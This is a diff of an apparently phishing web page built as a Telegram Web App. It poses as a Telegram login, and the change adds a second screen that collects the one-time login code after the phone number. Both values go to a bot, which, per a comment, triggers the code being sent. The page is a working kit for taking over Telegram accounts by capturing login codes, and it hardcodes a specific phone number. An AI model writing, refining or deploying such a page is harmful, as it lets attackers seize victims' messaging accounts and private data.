@@ -3,55 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Login</title>
-    <!-- ПОДКЛЮЧАЕМ СКРИПТ ТЕЛЕГРАМА -->
     <script src="https://telegram.org"></script>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #fff; }
-        h2 { font-weight: bold; margin-bottom: 20px; }
-        input { width: 80%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; margin-bottom: 20px; }
-        button { width: 85%; padding: 12px; background-color: #0088cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        button:active { background-color: #0077b5; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #fff; }
+        .step { display: none; }
+        .active { display: block; }
+        input { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; }
+        button { width: 85%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <h2>Введите номер телефона</h2>
-    
-    <!-- Добавили id="phone", чтобы скрипт мог найти номер -->
-    <input type="text" id="phone" value="+79133681204" placeholder="+7...">
-    
-    <!-- Добавили onclick, который запускает отправку -->
-    <button onclick="sendPhoneNumber()">Продолжить</button>
+    <!-- ШАГ 1: ТЕЛЕФОН -->
+    <div id="step-phone" class="step active">
+        <h2>Введите номер телефона</h2>
+        <input type="text" id="phone" value="+79133681204">
+        <button onclick="nextStep('phone')">Продолжить</button>
+    </div>
 
-   <script>
-    const tg = window.Telegram.WebApp;
+    <!-- ШАГ 2: КОД -->
+    <div id="step-code" class="step">
+        <h2>Введите код</h2>
+        <p>Код отправлен на ваш Telegram</p>
+        <input type="text" id="code" placeholder="12345">
+        <button onclick="nextStep('code')">Подтвердить</button>
+    </div>
 
-    function sendPhoneNumber() {
-        try {
-            const phoneInput = document.getElementById('phone').value;
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
 
-            // Проверка, инициализирован ли объект Telegram
-            if (!tg) {
-                alert("Ошибка: Telegram WebApp не инициализирован. Вы открыли приложение через кнопку клавиатуры?");
-                return;
+        function nextStep(current) {
+            if (current === 'phone') {
+                const phone = document.getElementById('phone').value;
+                
+                // 1. Отправляем номер боту (он начнет слать код)
+                tg.sendData("phone:" + phone); 
+                
+                // 2. Переключаем экран визуально
+                document.getElementById('step-phone').classList.remove('active');
+                document.getElementById('step-code').classList.add('active');
+            } 
+            else if (current === 'code') {
+                const code = document.getElementById('code').value;
+                
+                // 3. Отправляем код боту
+                tg.sendData("code:" + code);
+                
+                // 4. Закрываем приложение
+                tg.close();
             }
-
-            // Отправляем данные
-            tg.sendData("phone:" + phoneInput);
-            
-            // Если данные ушли, окно закроется само
-            tg.close(); 
-        } catch (e) {
-            alert("Ошибка в скрипте: " + e.message);
         }
-    }
-
-    // Сообщаем телеграму, что приложение готово
-    tg.ready();
-    tg.expand();
-</script>
-
+    </script>
 </body>
 </html>
-
